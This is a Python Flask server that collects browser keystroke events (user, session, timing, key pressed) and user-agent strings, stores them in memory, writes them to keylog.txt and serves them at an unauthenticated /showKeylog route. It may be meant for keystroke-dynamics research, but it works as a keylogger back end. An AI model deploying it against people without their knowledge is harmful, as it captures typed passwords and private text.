from flask import Flask, render_template, request, make_response, jsonify
import json
import requests
from json import JSONEncoder
import os,sys

def load_cfg(path):
  jsonres = {}
  try:
    with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
      jsonres = json.load(f)
  
  except Exception as e:
    print("Exception: ", e)
  
  return jsonres

keylog = []

class Key:
  def __init__(self, user, session, time, key_down, key):
    self.user = user
    self.session = session
    self.time = time
    self.key_down = key_down
    self.key = key

  def toJSON(self):
    return json.dumps(self, default=lambda o: o.__dict__, sort_keys=True, indent=4)

#start flask app
app = Flask(__name__)

@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/js_keylog', methods=['POST'])
def addLog():
  data = request.get_json()

  for key in range(len(data)):
    print(data[key])
    user = data[key]['user']
    session = data[key]['session']
    time = data[key]['time']
    key_down = data[key]['key-down']
    key_pressed = data[key]['key']

    k = Key(user,session, time,key_down,key_pressed)
    keylog.append(k)

  # url = main_cfg['apiHost'] + main_cfg['endpointKeys']
  # res = requests.post(url,keylog)

  return make_response(jsonify({'response': 'Success', 'code':200}), 200)

@app.route('/userAgent', methods=['POST'])
def addUserAgent():
  data = request.get_json()

  print(data)
  return make_response(jsonify({'response': 'Success', 'code':200}), 200)

@app.route('/js_keylog', methods=['GET'])
def keylogPage():
  return render_template('js_keylog.html')

@app.route('/showKeylog', methods=['GET'])
def showKeylog():
  res = {}
  
  for k in range(len(keylog)):
    res[k] = keylog[k].toJSON()
    print(res[k])
    with open("keylog.txt","a") as f:
      f.write(res[k])
      f.write("\n")
  return res

if __name__ == "__main__":
  main_cfg = load_cfg('./main_cfg.json')
  # app.run(host="0.0.0.0", port=int("6060"), debug=True)
  app.run(debug=True)
